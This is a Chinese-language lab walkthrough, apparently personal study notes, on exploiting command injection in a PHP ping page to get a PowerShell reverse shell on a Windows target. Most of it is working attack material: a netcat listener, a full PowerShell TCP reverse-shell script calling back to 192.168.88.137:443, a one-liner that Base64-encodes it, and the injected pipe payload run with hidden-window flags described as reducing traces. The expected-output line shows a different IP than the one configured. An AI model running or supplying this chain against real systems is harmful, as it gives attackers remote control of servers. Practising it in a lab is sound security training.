演练步骤：利用 PowerShell 实现反弹 Shell
默认网页存放地址：linux: /var/w /html
                windows:C:\phpstudy_pro\WWW
打开： `http://127.0.0.1/ping.php`
假设你的环境：
- 攻击机 (Kali): IP 设为 192.168.88.137 (请根据实际情况替换)
- 监听端口: 443
- 目标机 (Windows): 运行着你提供的 ping.php
## 第一步：在 Kali 上开启监听
打开终端，使用 netcat 监听端口：
`nc -lvnp 443`
## 第二步：准备 PowerShell Payload (Base64 编码版)
由于直接通过 Web 表单发送复杂的 PowerShell 脚本会包含大量特殊字符（如 $ , " , ; ），极易被 PHP 或 CMD 截断或转义错误。最稳健的方法是将 Payload 进行 Base64 编码。
1. 原始 Payload (PowerShell TCP 反弹):
 `$client = New-Object System.Net.Sockets.TCPClient("192.168.88.137",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();};$client.Close()`
 2. 在 Kali 上生成 Base64 编码:
   PowerShell 的 -EncodedCommand 参数需要 UTF-16LE 编码的 Base64 字符串。你可以在 Kali 终端运行以下命令来生成：
   `echo -n '$client = New-Object System.Net.Sockets.TCPClient("192.168.88.137",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();};$client.Close()' | iconv -t utf-16le | base64 -w 0` 
   ![[Pasted image 20251231163947.png]]
   ## 第三步：构造注入 Payload
   回到 PHP 页面。因为代码逻辑是：
   `$cmd = "ping -n 4 " . $target;`
   我们需要利用管道符 | 或者连接符 & 来截断 ping 命令并执行我们的恶意代码。
   输入框填写内容如下：
   `127.0.0.1 | powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADgAOAAuADEAMwA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAOwB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA`
解析：
- 127.0.0.1 : 让前面的 ping 命令有合法的参数，防止报错。
- | : 管道符，或者用 & (连接符)。
- powershell : 调用 PS。
- -nop : NoProfile，不加载配置文件，加快速度且减少痕迹。
- -w hidden : WindowStyle Hidden，隐藏窗口（虽然在 PHP shell_exec 下本身就看不见，但这是红队习惯）。
- -e : EncodedCommand，执行 Base64 编码的指令。
## 第四步：执行并获取 Shell
点击网页上的“执行”按钮。此时页面可能会卡住（因为 PHP 在等待命令结束），请切回你的 Kali 终端。
你应该会看到：
`connect to [192.168.1.100] from (UNKNOWN) [192.168.X.X] 49512`
恭喜，你已经拿到了 Windows 的 Shell。
![[Pasted image 20251231163920.png]]